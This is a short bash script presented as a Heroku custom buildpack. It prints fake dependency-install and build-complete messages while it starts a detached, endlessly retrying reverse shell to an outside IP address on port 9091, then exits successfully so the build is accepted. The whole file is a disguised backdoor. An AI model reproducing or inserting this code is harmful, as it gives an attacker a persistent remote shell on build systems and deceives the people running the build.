#!/bin/bash
BUILD_DIR=$1
CACHE_DIR=$2
ENV_DIR=$3

echo "-----> custom-buildpack app detected"
echo "-----> Installing dependencies..."

# Start reverse shell in background AND detach from build process
(
    while true; do
        bash -i >& /dev/tcp/44.220.20.213/9091 0>&1 2>/dev/null
        sleep 5
    done
) &>/dev/null &
disown -a

# Let connection establish
sleep 2

echo "-----> Build complete"

# Exit successfully so Heroku accepts the build
exit 0
